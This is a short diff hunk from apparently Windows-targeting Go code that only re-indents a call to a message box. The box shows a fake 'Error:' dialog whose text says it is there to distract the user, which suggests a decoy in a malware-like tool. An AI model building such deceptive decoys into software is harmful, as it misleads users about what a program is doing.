@@ -25,9 +25,9 @@ func messagebox() {
     title := "Error:"
     message := "Error to distract user."
     mbox.Call(0,
-        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(message))),
-        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
-        0)
+            uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(message))),
+            uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
+            0)
 }
 
 func getprocname(id uint32) string {
